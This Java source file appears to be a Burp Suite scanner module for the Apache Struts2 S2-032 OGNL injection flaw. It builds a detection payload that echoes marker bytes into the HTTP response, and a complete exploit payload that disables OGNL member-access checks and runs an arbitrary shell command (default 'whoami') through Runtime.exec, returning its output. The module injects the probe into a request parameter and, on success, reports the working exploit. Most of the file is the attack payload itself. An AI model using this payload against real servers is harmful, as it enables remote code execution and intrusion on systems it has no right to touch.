package module;

import burp.*;

import java.net.URLEncoder;
import java.util.Arrays;

public class S2_032 extends IModule {
    public S2_032() {
        poc =
            "method:" +
            "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
            "#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter()," +
            "#w.print(new java.lang.String(new byte[]{" + Arrays.toString(injectMark[0].getBytes()).replace("[", "").replace("]", "") + "}))," +
            "#w.print(new java.lang.String(new byte[]{" + Arrays.toString(injectMark[1].getBytes()).replace("[", "").replace("]", "") + "}))," +
            "#w.flush()," +
            "#w.close()," +
            "1?#xx:#request.toString";
        poc = URLEncoder.encode(poc);

        exp =
            "method:" +
            "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
            "#res=@org.apache.struts2.ServletActionContext@getResponse()," +
            "#res.setCharacterEncoding(#parameters.encoding[0])," +
            "#w=#res.getWriter()," +
            "#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0])," +
            "#str=#s.hasNext()?#s.next():new java.lang.String(new byte[]{32})," +
            "#w.print(#str)," +
            "#w.close()," +
            "1?#xx:#request.toString";
        exp =
            "pp=%5c%5ca" +
            "&ppp=%20" +
            "&encoding=UTF-8" +
            "&cmd=whoami&" +
            URLEncoder.encode(exp);

    }


    @Override
    public IScanIssue start() {
        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }
        IParameter newParameter = helpers.buildParameter(poc, "1", in);
        request = helpers.updateParameter(request, newParameter);

        if (check()) {
            this.detail = exp;
            return creatCustomScanIssue();
        }
        return null;
    }
}
